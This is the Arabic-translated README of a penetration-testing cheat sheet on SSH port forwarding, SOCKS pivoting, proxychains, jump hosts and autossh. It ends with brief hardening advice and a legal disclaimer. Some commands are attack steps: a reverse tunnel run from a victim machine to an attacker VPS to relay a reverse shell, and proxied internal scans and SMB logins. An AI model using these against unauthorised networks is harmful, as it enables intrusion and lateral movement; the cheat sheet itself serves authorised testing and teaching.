<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 أنفاق SSH وسلاسل الوكيل - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<p align="center">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="نفق SSH">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</ص>

<p align="center">
  <b>🚇 مرجع شامل لأنفاق SSH المحلية (-L)، والبعيدة/العكسي (-R)، وDynamic SOCKS (-D) مع تكامل Proxychains-ng</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وبنيات الأنفاق](#-نظرة عامة--بنيات الأنفاق)
- [إعادة توجيه المنفذ المحلي (`-L`)](#-local-port-forwarding--l)
  - [بناء الجملة والميكانيكا](#syntax--mechanics)
  - [إعادة توجيه واجهة ويب داخلية](#forwarding-an-internal-web-interface)
  - [إعادة توجيه منافذ قاعدة البيانات البعيدة](#forwarding-remote-database-ports)
- [إعادة توجيه المنفذ البعيد / العكسي (`-R`)](#-remote--reverse-port-forwarding--r)
  - [بناء الجملة والميكانيكا](#syntax--mechanics-1)
  - [تعريض معالج الصدفة العكسي المحلي](#expose-local-reverse-shell-handler)
  - [ترحيل حركة المرور الواردة من المنطقة المجردة من السلاح](#relaying-inbound-traffic-from-dmz)
- [إعادة توجيه الجوارب الديناميكية (`-D`)](#-dynamic-socks-forwarding--d)
  - [إعداد بناء الجملة وSOCKS5](#syntax--socks5-setup)
- [تكوين Proxychains-ng](#-proxychains-ng-configuration)
  - [تكوين `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [توجيه أدوات CLI من خلال Proxychains](#routing-cli-tools-through-proxychains)
- [مضيفات التمحور والقفز المتعددة (`-J`)](#-التمحور متعدد القفزات--jump-hosts--j)
- [الأنفاق المستمرة مع Autossh](#-الأنفاق المستمرة مع Autossh)
- [تسلسلات الهروب التفاعلية SSH (`~C`)](#-interactive-ssh-escape-sequences-c)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية وOPSEC](#-الاعتبارات الدفاعية--opsec)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة وهندسة الأنفاق

إن SSH ليس مجرد عميل طرفي بعيد؛ إنها طبقة نقل تدفق بايت مشفرة وثنائية الاتجاه تتحايل على سياسات جدار الحماية المقيدة للخروج/الدخول:

1. **إعادة توجيه المنفذ المحلي (`-L`):** يفتح منفذ استماع على **الجهاز المحلي للمهاجم**؛ يتم توجيه الاتصالات عبر SSH وإعادة توجيهها إلى وجهة يمكن الوصول إليها من خادم SSH البعيد.
2. **إعادة توجيه المنفذ البعيد (`-R`):** يفتح منفذ استماع على **خادم SSH البعيد**؛ يتم توجيه الاتصالات الواردة مرة أخرى إلى الجهاز المحلي للمهاجم أو الهدف الداخلي.
3. **إعادة توجيه المنفذ الديناميكي (`-D`):** يحول عميل SSH إلى وكيل **SOCKS4/SOCKS5 محلي**، مما يسمح للأدوات (Nmap وBurp Suite وFfuf وMetasploit) بتوجيه حركة مرور TCP التعسفية عبر الشبكة البعيدة.
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 إعادة توجيه المنفذ المحلي (`-L`)

### بناء الجملة والميكانيكا
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### إعادة توجيه واجهة ويب داخلية
قم بالوصول إلى لوحة إدارة الويب على `172.16.0.15:80` من خلال المحور `10.10.10.200`:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*الآن قم بالتصفح إلى `http://127.0.0.1:8080` في متصفحك المحلي.*

### إعادة توجيه منافذ قاعدة البيانات البعيدة
قم بالوصول إلى قاعدة بيانات PostgreSQL الداخلية المرتبطة فقط بـ `127.0.0.1:5432` على الخادم البعيد:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!ملاحظة]
> الأعلام المستخدمة:
> - `-N`: لا تقم بتنفيذ أمر Shell عن بعد (النفق فقط).
> - `-f`: يعمل في الخلفية مباشرة قبل تنفيذ الأمر.

---

## 🔄 إعادة توجيه المنفذ عن بعد / عكسي (`-R`)

### بناء الجملة والميكانيكا
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### الكشف عن معالج الصدفة العكسي المحلي
من جهاز هدف مخترق خلف NAT، اخترق جدران الحماية الصادرة لإرسال حركة المرور إلى مستمعك الخارجي على VPS:
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### ترحيل حركة المرور الواردة من المنطقة المجردة من السلاح
إعادة توجيه المنفذ 8080 على المحور البعيد إلى المنفذ المحلي 80:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!هام]
> لربط المنافذ البعيدة بجميع الواجهات (`0.0.0.0`)، يجب تعيين `/etc/ssh/sshd_config` لخادم SSH:
> `GatewayPorts yes` أو `GatewayPorts clientspecified`.

---

## 🌐 إعادة توجيه الجوارب الديناميكية (`-D`)

### إعداد بناء الجملة وSOCKS5
قم بإنشاء وكيل SOCKS5 ديناميكي على المنفذ المحلي `1080`:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
تحقق من أن وكيل SOCKS يستمع:
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ تكوين Proxychains-ng

تعترض Proxychains مكالمات شبكة المكتبة الديناميكية (`connect()`، `gethostbyname()`) عبر `LD_PRELOAD` لفرض تطبيقات CLI القياسية من خلال وكلاء SOCKS/HTTP.

### تكوين `/etc/proxychains4.conf`
قم بتحرير ملف التكوين للإشارة إلى نفق SSH Dynamic SOCKS الخاص بك:
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### توجيه أدوات CLI من خلال Proxychains
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 مضيفات التمحور والقفز المتعددة (`-J`)

عند عبور حدود جدار الحماية المجزأة المتعددة:
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 الأنفاق المستمرة مع Autossh

عندما تنخفض أنفاق SSH بسبب انتهاء مهلة الشبكة أو انقطاع NAT، يقوم `autossh` تلقائيًا بمراقبة اتصال SSH وإعادة تشغيله:
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ تسلسلات الهروب SSH التفاعلية (`~C`)

إذا كانت لديك بالفعل جلسة SSH تفاعلية مفتوحة وتحتاج فجأة إلى فتح منفذ للأمام دون قطع الاتصال:

1. اضغط على `Enter`
2. اكتب `~C` (تيلدا متبوعة بالحرف الكبير C)
3. يتغير الموجه إلى `ssh> `
4. أضف قواعد إعادة التوجيه الخاصة بك بسرعة:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
أو قم بإنشاء جوارب ديناميكية:
   ```text
   ssh> -D 1080
   ```
---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| **المنفذ المحلي إلى الأمام** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **المنفذ البعيد للأمام** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| ** وكيل SOCKS5 الديناميكي **| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **خلفية النفق الصامت** | `ssh -f -N -D 1080 user@pivot` |
| **الانتقال إلى محور المضيف** | `ssh -J user@hop1,user@hop2 target` |
| ** تشغيل الأداة عبر Proxychains ** | `proxychains4 <TOOL> <ARGS>` |
| ** إعادة الاتصال التلقائي المستمر ** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **نفق الطيران** | `Enter` ثم `~C` -> `ssh> -D 1080` |

---

## 🛡️ الاعتبارات الدفاعية وOPSEC

1. **تعطيل Port Forwarding في SSHD:** قم بتعيين `AllowTcpForwarding no` و`PermitTunnel no` في `/etc/ssh/sshd_config` على أنظمة الإنتاج المقواة.
2. **الكشف عن شذوذ تدفق الشبكة:** غالبًا ما تشير جلسات SSH المستمرة طويلة الأمد التي تنقل تدفقات بايت كبيرة ثنائية الاتجاه إلى النفق التفاعلي أو استخراج البيانات.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> يجب إجراء أنفاق SSH وتمحور الشبكة فقط على الشبكات والأنظمة التي تم الحصول على ترخيص كتابي صريح منها. يعد التجاوز غير المصرح به لجدران الحماية للشبكة المحيطة أمرًا غير قانوني.